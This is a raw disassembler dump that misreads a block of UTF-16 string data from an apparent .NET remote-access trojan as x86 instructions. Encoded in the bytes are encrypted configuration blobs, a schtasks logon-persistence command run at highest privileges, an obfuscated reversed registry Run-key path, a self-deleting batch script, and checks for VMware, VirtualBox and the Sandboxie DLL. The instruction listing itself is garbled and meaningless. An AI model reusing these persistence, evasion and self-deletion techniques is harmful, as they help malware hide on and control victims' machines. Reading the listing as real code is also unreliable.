  40bef5:	77 00                	ja     0x40bef7
  40bef7:	69 00 38 00 57 00    	imul   $0x570038,(%eax),%eax
  40befd:	56                   	push   %esi
  40befe:	00 30                	add    %dh,(%eax)
  40bf00:	00 6c 00 73          	add    %ch,0x73(%eax,%eax,1)
  40bf04:	00 72 00             	add    %dh,0x0(%edx)
  40bf07:	4d                   	dec    %ebp
  40bf08:	00 46 00             	add    %al,0x0(%esi)
  40bf0b:	71 00                	jno    0x40bf0d
  40bf0d:	77 00                	ja     0x40bf0f
  40bf0f:	74 00                	je     0x40bf11
  40bf11:	79 00                	jns    0x40bf13
  40bf13:	66 00 57 00          	data16 add %dl,0x0(%edi)
  40bf17:	48                   	dec    %eax
  40bf18:	00 34 00             	add    %dh,(%eax,%eax,1)
  40bf1b:	31 00                	xor    %eax,(%eax)
  40bf1d:	67 00 70 00          	add    %dh,0x0(%bx,%si)
  40bf21:	6c                   	insb   (%dx),%es:(%edi)
  40bf22:	00 63 00             	add    %ah,0x0(%ebx)
  40bf25:	51                   	push   %ecx
  40bf26:	00 50 00             	add    %dl,0x0(%eax)
  40bf29:	30 00                	xor    %al,(%eax)
  40bf2b:	2b 00                	sub    (%eax),%eax
  40bf2d:	52                   	push   %edx
  40bf2e:	00 57 00             	add    %dl,0x0(%edi)
  40bf31:	38 00                	cmp    %al,(%eax)
  40bf33:	5a                   	pop    %edx
  40bf34:	00 2f                	add    %ch,(%edi)
  40bf36:	00 79 00             	add    %bh,0x0(%ecx)
  40bf39:	50                   	push   %eax
  40bf3a:	00 61 00             	add    %ah,0x0(%ecx)
  40bf3d:	2f                   	das
  40bf3e:	00 72 00             	add    %dh,0x0(%edx)
  40bf41:	32 00                	xor    (%eax),%al
  40bf43:	58                   	pop    %eax
  40bf44:	00 43 00             	add    %al,0x0(%ebx)
  40bf47:	46                   	inc    %esi
  40bf48:	00 7a 00             	add    %bh,0x0(%edx)
  40bf4b:	4c                   	dec    %esp
  40bf4c:	00 72 00             	add    %dh,0x0(%edx)
  40bf4f:	34 00                	xor    $0x0,%al
  40bf51:	59                   	pop    %ecx
  40bf52:	00 45 00             	add    %al,0x0(%ebp)
  40bf55:	51                   	push   %ecx
  40bf56:	00 2b                	add    %ch,(%ebx)
  40bf58:	00 32                	add    %dh,(%edx)
  40bf5a:	00 71 00             	add    %dh,0x0(%ecx)
  40bf5d:	51                   	push   %ecx
  40bf5e:	00 78 00             	add    %bh,0x0(%eax)
  40bf61:	6e                   	outsb  %ds:(%esi),(%dx)
  40bf62:	00 76 00             	add    %dh,0x0(%esi)
  40bf65:	74 00                	je     0x40bf67
  40bf67:	49                   	dec    %ecx
  40bf68:	00 41 00             	add    %al,0x0(%ecx)
  40bf6b:	36 00 72 00          	add    %dh,%ss:0x0(%edx)
  40bf6f:	51                   	push   %ecx
  40bf70:	00 4e 00             	add    %cl,0x0(%esi)
  40bf73:	38 00                	cmp    %al,(%eax)
  40bf75:	6e                   	outsb  %ds:(%esi),(%dx)
  40bf76:	00 2b                	add    %ch,(%ebx)
  40bf78:	00 41 00             	add    %al,0x0(%ecx)
  40bf7b:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40bf80:	80 b1 78 00 61 00 6b 	xorb   $0x6b,0x610078(%ecx)
  40bf87:	00 6b 00             	add    %ch,0x0(%ebx)
  40bf8a:	64 00 66 00          	add    %ah,%fs:0x0(%esi)
  40bf8e:	41                   	inc    %ecx
  40bf8f:	00 44 00 59          	add    %al,0x59(%eax,%eax,1)
  40bf93:	00 6b 00             	add    %ch,0x0(%ebx)
  40bf96:	74 00                	je     0x40bf98
  40bf98:	54                   	push   %esp
  40bf99:	00 70 00             	add    %dh,0x0(%eax)
  40bf9c:	33 00                	xor    (%eax),%eax
  40bf9e:	7a 00                	jp     0x40bfa0
  40bfa0:	69 00 6f 00 66 00    	imul   $0x66006f,(%eax),%eax
  40bfa6:	6a 00                	push   $0x0
  40bfa8:	53                   	push   %ebx
  40bfa9:	00 6a 00             	add    %ch,0x0(%edx)
  40bfac:	79 00                	jns    0x40bfae
  40bfae:	32 00                	xor    (%eax),%al
  40bfb0:	4a                   	dec    %edx
  40bfb1:	00 62 00             	add    %ah,0x0(%edx)
  40bfb4:	57                   	push   %edi
  40bfb5:	00 62 00             	add    %ah,0x0(%edx)
  40bfb8:	36 00 37             	add    %dh,%ss:(%edi)
  40bfbb:	00 68 00             	add    %ch,0x0(%eax)
  40bfbe:	4f                   	dec    %edi
  40bfbf:	00 5a 00             	add    %bl,0x0(%edx)
  40bfc2:	34 00                	xor    $0x0,%al
  40bfc4:	31 00                	xor    %eax,(%eax)
  40bfc6:	52                   	push   %edx
  40bfc7:	00 49 00             	add    %cl,0x0(%ecx)
  40bfca:	36 00 47 00          	add    %al,%ss:0x0(%edi)
  40bfce:	32 00                	xor    (%eax),%al
  40bfd0:	36 00 34 00          	add    %dh,%ss:(%eax,%eax,1)
  40bfd4:	4d                   	dec    %ebp
  40bfd5:	00 32                	add    %dh,(%edx)
  40bfd7:	00 4c 00 4a          	add    %cl,0x4a(%eax,%eax,1)
  40bfdb:	00 79 00             	add    %bh,0x0(%ecx)
  40bfde:	63 00                	arpl   %eax,(%eax)
  40bfe0:	30 00                	xor    %al,(%eax)
  40bfe2:	4f                   	dec    %edi
  40bfe3:	00 6e 00             	add    %ch,0x0(%esi)
  40bfe6:	6c                   	insb   (%dx),%es:(%edi)
  40bfe7:	00 38                	add    %bh,(%eax)
  40bfe9:	00 36                	add    %dh,(%esi)
  40bfeb:	00 46 00             	add    %al,0x0(%esi)
  40bfee:	50                   	push   %eax
  40bfef:	00 33                	add    %dh,(%ebx)
  40bff1:	00 38                	add    %bh,(%eax)
  40bff3:	00 4a 00             	add    %cl,0x0(%edx)
  40bff6:	47                   	inc    %edi
  40bff7:	00 62 00             	add    %ah,0x0(%edx)
  40bffa:	78 00                	js     0x40bffc
  40bffc:	6d                   	insl   (%dx),%es:(%edi)
  40bffd:	00 6c 00 6d          	add    %ch,0x6d(%eax,%eax,1)
  40c001:	00 45 00             	add    %al,0x0(%ebp)
  40c004:	76 00                	jbe    0x40c006
  40c006:	4c                   	dec    %esp
  40c007:	00 52 00             	add    %dl,0x0(%edx)
  40c00a:	37                   	aaa
  40c00b:	00 52 00             	add    %dl,0x0(%edx)
  40c00e:	53                   	push   %ebx
  40c00f:	00 46 00             	add    %al,0x0(%esi)
  40c012:	67 00 55 00          	add    %dl,0x0(%di)
  40c016:	51                   	push   %ecx
  40c017:	00 74 00 71          	add    %dh,0x71(%eax,%eax,1)
  40c01b:	00 73 00             	add    %dh,0x0(%ebx)
  40c01e:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40c022:	44                   	inc    %esp
  40c023:	00 36                	add    %dh,(%esi)
  40c025:	00 4a 00             	add    %cl,0x0(%edx)
  40c028:	2f                   	das
  40c029:	00 7a 00             	add    %bh,0x0(%edx)
  40c02c:	41                   	inc    %ecx
  40c02d:	00 3d 00 3d 00 00    	add    %bh,0x3d00
  40c033:	03 33                	add    (%ebx),%esi
  40c035:	00 00                	add    %al,(%eax)
  40c037:	80 b1 43 00 41 00 50 	xorb   $0x50,0x410043(%ecx)
  40c03e:	00 65 00             	add    %ah,0x0(%ebp)
  40c041:	61                   	popa
  40c042:	00 52 00             	add    %dl,0x0(%edx)
  40c045:	78 00                	js     0x40c047
  40c047:	31 00                	xor    %eax,(%eax)
  40c049:	64 00 70 00          	add    %dh,%fs:0x0(%eax)
  40c04d:	58                   	pop    %eax
  40c04e:	00 46 00             	add    %al,0x0(%esi)
  40c051:	54                   	push   %esp
  40c052:	00 36                	add    %dh,(%esi)
  40c054:	00 46 00             	add    %al,0x0(%esi)
  40c057:	68 00 54 00 61       	push   $0x61005400
  40c05c:	00 4f 00             	add    %cl,0x0(%edi)
  40c05f:	32 00                	xor    (%eax),%al
  40c061:	76 00                	jbe    0x40c063
  40c063:	65 00 35 00 64 00 52 	add    %dh,%gs:0x52006400
  40c06a:	00 35 00 55 00 45    	add    %dh,0x45005500
  40c070:	00 62 00             	add    %ah,0x0(%edx)
  40c073:	78 00                	js     0x40c075
  40c075:	4f                   	dec    %edi
  40c076:	00 73 00             	add    %dh,0x0(%ebx)
  40c079:	51                   	push   %ecx
  40c07a:	00 55 00             	add    %dl,0x0(%ebp)
  40c07d:	44                   	inc    %esp
  40c07e:	00 4a 00             	add    %cl,0x0(%edx)
  40c081:	32 00                	xor    (%eax),%al
  40c083:	73 00                	jae    0x40c085
  40c085:	57                   	push   %edi
  40c086:	00 55 00             	add    %dl,0x0(%ebp)
  40c089:	74 00                	je     0x40c08b
  40c08b:	4e                   	dec    %esi
  40c08c:	00 54 00 48          	add    %dl,0x48(%eax,%eax,1)
  40c090:	00 36                	add    %dh,(%esi)
  40c092:	00 35 00 54 00 6c    	add    %dh,0x6c005400
  40c098:	00 6b 00             	add    %ch,0x0(%ebx)
  40c09b:	7a 00                	jp     0x40c09d
  40c09d:	70 00                	jo     0x40c09f
  40c09f:	54                   	push   %esp
  40c0a0:	00 6f 00             	add    %ch,0x0(%edi)
  40c0a3:	78 00                	js     0x40c0a5
  40c0a5:	37                   	aaa
  40c0a6:	00 47 00             	add    %al,0x0(%edi)
  40c0a9:	45                   	inc    %ebp
  40c0aa:	00 6f 00             	add    %ch,0x0(%edi)
  40c0ad:	33 00                	xor    (%eax),%eax
  40c0af:	41                   	inc    %ecx
  40c0b0:	00 68 00             	add    %ch,0x0(%eax)
  40c0b3:	65 00 79 00          	add    %bh,%gs:0x0(%ecx)
  40c0b7:	31 00                	xor    %eax,(%eax)
  40c0b9:	75 00                	jne    0x40c0bb
  40c0bb:	41                   	inc    %ecx
  40c0bc:	00 76 00             	add    %dh,0x0(%esi)
  40c0bf:	2f                   	das
  40c0c0:	00 52 00             	add    %dl,0x0(%edx)
  40c0c3:	4a                   	dec    %edx
  40c0c4:	00 54 00 64          	add    %dl,0x64(%eax,%eax,1)
  40c0c8:	00 2b                	add    %ch,(%ebx)
  40c0ca:	00 31                	add    %dh,(%ecx)
  40c0cc:	00 72 00             	add    %dh,0x0(%edx)
  40c0cf:	43                   	inc    %ebx
  40c0d0:	00 43 00             	add    %al,0x0(%ebx)
  40c0d3:	46                   	inc    %esi
  40c0d4:	00 38                	add    %bh,(%eax)
  40c0d6:	00 78 00             	add    %bh,0x0(%eax)
  40c0d9:	59                   	pop    %ecx
  40c0da:	00 6a 00             	add    %ch,0x0(%edx)
  40c0dd:	58                   	pop    %eax
  40c0de:	00 2b                	add    %ch,(%ebx)
  40c0e0:	00 78 00             	add    %bh,0x0(%eax)
  40c0e3:	41                   	inc    %ecx
  40c0e4:	00 3d 00 3d 00 00    	add    %bh,0x3d00
  40c0ea:	09 6e 00             	or     %ebp,0x0(%esi)
  40c0ed:	75 00                	jne    0x40c0ef
  40c0ef:	6c                   	insb   (%dx),%es:(%edi)
  40c0f0:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40c0f4:	01 00                	add    %eax,(%eax)
  40c0f6:	03 3a                	add    (%edx),%edi
  40c0f8:	00 00                	add    %al,(%eax)
  40c0fa:	0d 50 00 61 00       	or     $0x610050,%eax
  40c0ff:	63 00                	arpl   %eax,(%eax)
  40c101:	6b 00 65             	imul   $0x65,(%eax),%eax
  40c104:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  40c108:	09 50 00             	or     %edx,0x0(%eax)
  40c10b:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  40c111:	00 0f                	add    %cl,(%edi)
  40c113:	4d                   	dec    %ebp
  40c114:	00 65 00             	add    %ah,0x0(%ebp)
  40c117:	73 00                	jae    0x40c119
  40c119:	73 00                	jae    0x40c11b
  40c11b:	61                   	popa
  40c11c:	00 67 00             	add    %ah,0x0(%edi)
  40c11f:	65 00 00             	add    %al,%gs:(%eax)
  40c122:	07                   	pop    %es
  40c123:	63 00                	arpl   %eax,(%eax)
  40c125:	6d                   	insl   (%dx),%es:(%edi)
  40c126:	00 64 00 00          	add    %ah,0x0(%eax,%eax,1)
  40c12a:	69 2f 00 63 00 20    	imul   $0x20006300,(%edi),%ebp
  40c130:	00 73 00             	add    %dh,0x0(%ebx)
  40c133:	63 00                	arpl   %eax,(%eax)
  40c135:	68 00 74 00 61       	push   $0x61007400
  40c13a:	00 73 00             	add    %dh,0x0(%ebx)
  40c13d:	6b 00 73             	imul   $0x73,(%eax),%eax
  40c140:	00 20                	add    %ah,(%eax)
  40c142:	00 2f                	add    %ch,(%edi)
  40c144:	00 63 00             	add    %ah,0x0(%ebx)
  40c147:	72 00                	jb     0x40c149
  40c149:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40c14d:	74 00                	je     0x40c14f
  40c14f:	65 00 20             	add    %ah,%gs:(%eax)
  40c152:	00 2f                	add    %ch,(%edi)
  40c154:	00 66 00             	add    %ah,0x0(%esi)
  40c157:	20 00                	and    %al,(%eax)
  40c159:	2f                   	das
  40c15a:	00 73 00             	add    %dh,0x0(%ebx)
  40c15d:	63 00                	arpl   %eax,(%eax)
  40c15f:	20 00                	and    %al,(%eax)
  40c161:	6f                   	outsl  %ds:(%esi),(%dx)
  40c162:	00 6e 00             	add    %ch,0x0(%esi)
  40c165:	6c                   	insb   (%dx),%es:(%edi)
  40c166:	00 6f 00             	add    %ch,0x0(%edi)
  40c169:	67 00 6f 00          	add    %ch,0x0(%bx)
  40c16d:	6e                   	outsb  %ds:(%esi),(%dx)
  40c16e:	00 20                	add    %ah,(%eax)
  40c170:	00 2f                	add    %ch,(%edi)
  40c172:	00 72 00             	add    %dh,0x0(%edx)
  40c175:	6c                   	insb   (%dx),%es:(%edi)
  40c176:	00 20                	add    %ah,(%eax)
  40c178:	00 68 00             	add    %ch,0x0(%eax)
  40c17b:	69 00 67 00 68 00    	imul   $0x680067,(%eax),%eax
  40c181:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40c185:	74 00                	je     0x40c187
  40c187:	20 00                	and    %al,(%eax)
  40c189:	2f                   	das
  40c18a:	00 74 00 6e          	add    %dh,0x6e(%eax,%eax,1)
  40c18e:	00 20                	add    %ah,(%eax)
  40c190:	00 22                	add    %ah,(%edx)
  40c192:	00 00                	add    %al,(%eax)
  40c194:	11 22                	adc    %esp,(%edx)
  40c196:	00 20                	add    %ah,(%eax)
  40c198:	00 2f                	add    %ch,(%edi)
  40c19a:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  40c19e:	00 20                	add    %ah,(%eax)
  40c1a0:	00 27                	add    %ah,(%edi)
  40c1a2:	00 22                	add    %ah,(%edx)
  40c1a4:	00 01                	add    %al,(%ecx)
  40c1a6:	13 22                	adc    (%edx),%esp
  40c1a8:	00 27                	add    %ah,(%edi)
  40c1aa:	00 20                	add    %ah,(%eax)
  40c1ac:	00 26                	add    %ah,(%esi)
  40c1ae:	00 20                	add    %ah,(%eax)
  40c1b0:	00 65 00             	add    %ah,0x0(%ebp)
  40c1b3:	78 00                	js     0x40c1b5
  40c1b5:	69 00 74 00 01 5d    	imul   $0x5d010074,(%eax),%eax
  40c1bb:	5c                   	pop    %esp
  40c1bc:	00 6e 00             	add    %ch,0x0(%esi)
  40c1bf:	75 00                	jne    0x40c1c1
  40c1c1:	52                   	push   %edx
  40c1c2:	00 5c 00 6e          	add    %bl,0x6e(%eax,%eax,1)
  40c1c6:	00 6f 00             	add    %ch,0x0(%edi)
  40c1c9:	69 00 73 00 72 00    	imul   $0x720073,(%eax),%eax
  40c1cf:	65 00 56 00          	add    %dl,%gs:0x0(%esi)
  40c1d3:	74 00                	je     0x40c1d5
  40c1d5:	6e                   	outsb  %ds:(%esi),(%dx)
  40c1d6:	00 65 00             	add    %ah,0x0(%ebp)
  40c1d9:	72 00                	jb     0x40c1db
  40c1db:	72 00                	jb     0x40c1dd
  40c1dd:	75 00                	jne    0x40c1df
  40c1df:	43                   	inc    %ebx
  40c1e0:	00 5c 00 73          	add    %bl,0x73(%eax,%eax,1)
  40c1e4:	00 77 00             	add    %dh,0x0(%edi)
  40c1e7:	6f                   	outsl  %ds:(%esi),(%dx)
  40c1e8:	00 64 00 6e          	add    %ah,0x6e(%eax,%eax,1)
  40c1ec:	00 69 00             	add    %ch,0x0(%ecx)
  40c1ef:	57                   	push   %edi
  40c1f0:	00 5c 00 74          	add    %bl,0x74(%eax,%eax,1)
  40c1f4:	00 66 00             	add    %ah,0x0(%esi)
  40c1f7:	6f                   	outsl  %ds:(%esi),(%dx)
  40c1f8:	00 73 00             	add    %dh,0x0(%ebx)
  40c1fb:	6f                   	outsl  %ds:(%esi),(%dx)
  40c1fc:	00 72 00             	add    %dh,0x0(%edx)
  40c1ff:	63 00                	arpl   %eax,(%eax)
  40c201:	69 00 4d 00 5c 00    	imul   $0x5c004d,(%eax),%eax
  40c207:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c20b:	61                   	popa
  40c20c:	00 77 00             	add    %dh,0x0(%edi)
  40c20f:	74 00                	je     0x40c211
  40c211:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40c215:	53                   	push   %ebx
  40c216:	00 00                	add    %al,(%eax)
  40c218:	03 22                	add    (%edx),%esp
  40c21a:	00 00                	add    %al,(%eax)
  40c21c:	09 2e                	or     %ebp,(%esi)
  40c21e:	00 62 00             	add    %ah,0x0(%edx)
  40c221:	61                   	popa
  40c222:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  40c226:	13 40 00             	adc    0x0(%eax),%eax
  40c229:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40c22d:	68 00 6f 00 20       	push   $0x20006f00
  40c232:	00 6f 00             	add    %ch,0x0(%edi)
  40c235:	66 00 66 00          	data16 add %ah,0x0(%esi)
  40c239:	00 1f                	add    %bl,(%edi)
  40c23b:	74 00                	je     0x40c23d
  40c23d:	69 00 6d 00 65 00    	imul   $0x65006d,(%eax),%eax
  40c243:	6f                   	outsl  %ds:(%esi),(%dx)
  40c244:	00 75 00             	add    %dh,0x0(%ebp)
  40c247:	74 00                	je     0x40c249
  40c249:	20 00                	and    %al,(%eax)
  40c24b:	33 00                	xor    (%eax),%eax
  40c24d:	20 00                	and    %al,(%eax)
  40c24f:	3e 00 20             	add    %ah,%ds:(%eax)
  40c252:	00 4e 00             	add    %cl,0x0(%esi)
  40c255:	55                   	push   %ebp
  40c256:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  40c25a:	15 53 00 54 00       	adc    $0x540053,%eax
  40c25f:	41                   	inc    %ecx
  40c260:	00 52 00             	add    %dl,0x0(%edx)
  40c263:	54                   	push   %esp
  40c264:	00 20                	add    %ah,(%eax)
  40c266:	00 22                	add    %ah,(%edx)
  40c268:	00 22                	add    %ah,(%edx)
  40c26a:	00 20                	add    %ah,(%eax)
  40c26c:	00 22                	add    %ah,(%edx)
  40c26e:	00 00                	add    %al,(%eax)
  40c270:	07                   	pop    %es
  40c271:	43                   	inc    %ebx
  40c272:	00 44 00 20          	add    %al,0x20(%eax,%eax,1)
  40c276:	00 00                	add    %al,(%eax)
  40c278:	0b 44 00 45          	or     0x45(%eax,%eax,1),%eax
  40c27c:	00 4c 00 20          	add    %cl,0x20(%eax,%eax,1)
  40c280:	00 22                	add    %ah,(%edx)
  40c282:	00 00                	add    %al,(%eax)
  40c284:	0f 22 00             	mov    %eax,%cr0
  40c287:	20 00                	and    %al,(%eax)
  40c289:	2f                   	das
  40c28a:	00 66 00             	add    %ah,0x0(%esi)
  40c28d:	20 00                	and    %al,(%eax)
  40c28f:	2f                   	das
  40c290:	00 71 00             	add    %dh,0x0(%ecx)
  40c293:	00 05 78 00 70 00    	add    %al,0x700078
  40c299:	00 45 53             	add    %al,0x53(%ebp)
  40c29c:	00 65 00             	add    %ah,0x0(%ebp)
  40c29f:	6c                   	insb   (%dx),%es:(%edi)
  40c2a0:	00 65 00             	add    %ah,0x0(%ebp)
  40c2a3:	63 00                	arpl   %eax,(%eax)
  40c2a5:	74 00                	je     0x40c2a7
  40c2a7:	20 00                	and    %al,(%eax)
  40c2a9:	2a 00                	sub    (%eax),%al
  40c2ab:	20 00                	and    %al,(%eax)
  40c2ad:	66 00 72 00          	data16 add %dh,0x0(%edx)
  40c2b1:	6f                   	outsl  %ds:(%esi),(%dx)
  40c2b2:	00 6d 00             	add    %ch,0x0(%ebp)
  40c2b5:	20 00                	and    %al,(%eax)
  40c2b7:	57                   	push   %edi
  40c2b8:	00 69 00             	add    %ch,0x0(%ecx)
  40c2bb:	6e                   	outsb  %ds:(%esi),(%dx)
  40c2bc:	00 33                	add    %dh,(%ebx)
  40c2be:	00 32                	add    %dh,(%edx)
  40c2c0:	00 5f 00             	add    %bl,0x0(%edi)
  40c2c3:	43                   	inc    %ebx
  40c2c4:	00 6f 00             	add    %ch,0x0(%edi)
  40c2c7:	6d                   	insl   (%dx),%es:(%edi)
  40c2c8:	00 70 00             	add    %dh,0x0(%eax)
  40c2cb:	75 00                	jne    0x40c2cd
  40c2cd:	74 00                	je     0x40c2cf
  40c2cf:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c2d3:	53                   	push   %ebx
  40c2d4:	00 79 00             	add    %bh,0x0(%ecx)
  40c2d7:	73 00                	jae    0x40c2d9
  40c2d9:	74 00                	je     0x40c2db
  40c2db:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40c2df:	00 19                	add    %bl,(%ecx)
  40c2e1:	4d                   	dec    %ebp
  40c2e2:	00 61 00             	add    %ah,0x0(%ecx)
  40c2e5:	6e                   	outsb  %ds:(%esi),(%dx)
  40c2e6:	00 75 00             	add    %dh,0x0(%ebp)
  40c2e9:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  40c2ed:	63 00                	arpl   %eax,(%eax)
  40c2ef:	74 00                	je     0x40c2f1
  40c2f1:	75 00                	jne    0x40c2f3
  40c2f3:	72 00                	jb     0x40c2f5
  40c2f5:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c2f9:	00 2b                	add    %ch,(%ebx)
  40c2fb:	6d                   	insl   (%dx),%es:(%edi)
  40c2fc:	00 69 00             	add    %ch,0x0(%ecx)
  40c2ff:	63 00                	arpl   %eax,(%eax)
  40c301:	72 00                	jb     0x40c303
  40c303:	6f                   	outsl  %ds:(%esi),(%dx)
  40c304:	00 73 00             	add    %dh,0x0(%ebx)
  40c307:	6f                   	outsl  %ds:(%esi),(%dx)
  40c308:	00 66 00             	add    %ah,0x0(%esi)
  40c30b:	74 00                	je     0x40c30d
  40c30d:	20 00                	and    %al,(%eax)
  40c30f:	63 00                	arpl   %eax,(%eax)
  40c311:	6f                   	outsl  %ds:(%esi),(%dx)
  40c312:	00 72 00             	add    %dh,0x0(%edx)
  40c315:	70 00                	jo     0x40c317
  40c317:	6f                   	outsl  %ds:(%esi),(%dx)
  40c318:	00 72 00             	add    %dh,0x0(%edx)
  40c31b:	61                   	popa
  40c31c:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40c320:	00 6f 00             	add    %ch,0x0(%edi)
  40c323:	6e                   	outsb  %ds:(%esi),(%dx)
  40c324:	00 00                	add    %al,(%eax)
  40c326:	0b 4d 00             	or     0x0(%ebp),%ecx
  40c329:	6f                   	outsl  %ds:(%esi),(%dx)
  40c32a:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40c32e:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40c332:	0f 56 00             	orps   (%eax),%xmm0
  40c335:	49                   	dec    %ecx
  40c336:	00 52 00             	add    %dl,0x0(%edx)
  40c339:	54                   	push   %esp
  40c33a:	00 55 00             	add    %dl,0x0(%ebp)
  40c33d:	41                   	inc    %ecx
  40c33e:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  40c342:	0d 76 00 6d 00       	or     $0x6d0076,%eax
  40c347:	77 00                	ja     0x40c349
  40c349:	61                   	popa
  40c34a:	00 72 00             	add    %dh,0x0(%edx)
  40c34d:	65 00 00             	add    %al,%gs:(%eax)
  40c350:	15 56 00 69 00       	adc    $0x690056,%eax
  40c355:	72 00                	jb     0x40c357
  40c357:	74 00                	je     0x40c359
  40c359:	75 00                	jne    0x40c35b
  40c35b:	61                   	popa
  40c35c:	00 6c 00 42          	add    %ch,0x42(%eax,%eax,1)
  40c360:	00 6f 00             	add    %ch,0x0(%edi)
  40c363:	78 00                	js     0x40c365
  40c365:	00 17                	add    %dl,(%edi)
  40c367:	53                   	push   %ebx
  40c368:	00 62 00             	add    %ah,0x0(%edx)
  40c36b:	69 00 65 00 44 00    	imul   $0x440065,(%eax),%eax
  40c371:	6c                   	insb   (%dx),%es:(%edi)
  40c372:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  40c376:	00 64 00 6c          	add    %ah,0x6c(%eax,%eax,1)
  40c37a:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40c37e:	11 45 00             	adc    %eax,0x0(%ebp)
  40c381:	72 00                	jb     0x40c383
  40c383:	72 00                	jb     0x40c385
  40c385:	20 00                	and    %al,(%eax)
  40c387:	48                   	dec    %eax
  40c388:	00 57 00             	add    %dl,0x0(%edi)
  40c38b:	49                   	dec    %ecx
  40c38c:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  40c390:	05 78 00 32 00       	add    $0x320078,%eax
  40c395:	00 15 43 00 6c 00    	add    %dl,0x6c0043
  40c39b:	69 00 65 00 6e 00    	imul   $0x6e0065,(%eax),%eax
  40c3a1:	74 00                	je     0x40c3a3
  40c3a3:	49                   	dec    %ecx
  40c3a4:	00 6e 00             	add    %ch,0x0(%esi)
  40c3a7:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40c3ab:	00 09                	add    %cl,(%ecx)
  40c3ad:	48                   	dec    %eax
  40c3ae:	00 57 00             	add    %dl,0x0(%edi)
  40c3b1:	49                   	dec    %ecx
  40c3b2:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  40c3b6:	09 55 00             	or     %edx,0x0(%ebp)
  40c3b9:	73 00                	jae    0x40c3bb
  40c3bb:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c3bf:	00 05 4f 00 53 00    	add    %al,0x53004f
  40c3c5:	00 13                	add    %dl,(%ebx)
  40c3c7:	4d                   	dec    %ebp
  40c3c8:	00 69 00             	add    %ch,0x0(%ecx)
  40c3cb:	63 00                	arpl   %eax,(%eax)
  40c3cd:	72 00                	jb     0x40c3cf
  40c3cf:	6f                   	outsl  %ds:(%esi),(%dx)
  40c3d0:	00 73 00             	add    %dh,0x0(%ebx)
  40c3d3:	6f                   	outsl  %ds:(%esi),(%dx)
  40c3d4:	00 66 00             	add    %ah,0x0(%esi)
  40c3d7:	74 00                	je     0x40c3d9
  40c3d9:	00 03                	add    %al,(%ebx)
  40c3db:	20 00                	and    %al,(%eax)
  40c3dd:	00 09                	add    %cl,(%ecx)
  40c3df:	54                   	push   %esp
  40c3e0:	00 72 00             	add    %dh,0x0(%edx)
  40c3e3:	75 00                	jne    0x40c3e5
  40c3e5:	65 00 00             	add    %al,%gs:(%eax)
  40c3e8:	0b 36                	or     (%esi),%esi
  40c3ea:	00 34 00             	add    %dh,(%eax,%eax,1)
  40c3ed:	62 00                	bound  %eax,(%eax)
  40c3ef:	69 00 74 00 00 0b    	imul   $0xb000074,(%eax),%eax
  40c3f5:	46                   	inc    %esi
  40c3f6:	00 61 00             	add    %ah,0x0(%ecx)
  40c3f9:	6c                   	insb   (%dx),%es:(%edi)
  40c3fa:	00 73 00             	add    %dh,0x0(%ebx)
  40c3fd:	65 00 00             	add    %al,%gs:(%eax)
  40c400:	0b 33                	or     (%ebx),%esi
  40c402:	00 32                	add    %dh,(%edx)
  40c404:	00 62 00             	add    %ah,0x0(%edx)
  40c407:	69 00 74 00 00 09    	imul   $0x9000074,(%eax),%eax
  40c40d:	50                   	push   %eax
  40c40e:	00 61 00             	add    %ah,0x0(%ecx)
  40c411:	74 00                	je     0x40c413
  40c413:	68 00 00 0f 56       	push   $0x560f0000
  40c418:	00 65 00             	add    %ah,0x0(%ebp)
  40c41b:	72 00                	jb     0x40c41d
  40c41d:	73 00                	jae    0x40c41f
  40c41f:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40c425:	00 0b                	add    %cl,(%ebx)
  40c427:	41                   	inc    %ecx
  40c428:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
  40c42c:	00 69 00             	add    %ch,0x0(%ecx)
  40c42f:	6e                   	outsb  %ds:(%esi),(%dx)
  40c430:	00 00                	add    %al,(%eax)
  40c432:	09 74 00 72          	or     %esi,0x72(%eax,%eax,1)
  40c436:	00 75 00             	add    %dh,0x0(%ebp)
  40c439:	65 00 00             	add    %al,%gs:(%eax)
  40c43c:	0b 66 00             	or     0x0(%esi),%esp
  40c43f:	61                   	popa
  40c440:	00 6c 00 73          	add    %ch,0x73(%eax,%eax,1)
  40c444:	00 65 00             	add    %ah,0x0(%ebp)
  40c447:	00 17                	add    %dl,(%edi)
  40c449:	50                   	push   %eax
  40c44a:	00 65 00             	add    %ah,0x0(%ebp)
  40c44d:	72 00                	jb     0x40c44f
  40c44f:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40c453:	72 00                	jb     0x40c455
  40c455:	6d                   	insl   (%dx),%es:(%edi)
  40c456:	00 61 00             	add    %ah,0x0(%ecx)
  40c459:	6e                   	outsb  %ds:(%esi),(%dx)
  40c45a:	00 63 00             	add    %ah,0x0(%ebx)
  40c45d:	65 00 00             	add    %al,%gs:(%eax)
  40c460:	11 50 00             	adc    %edx,0x0(%eax)
  40c463:	61                   	popa
  40c464:	00 73 00             	add    %dh,0x0(%ebx)
  40c467:	74 00                	je     0x40c469
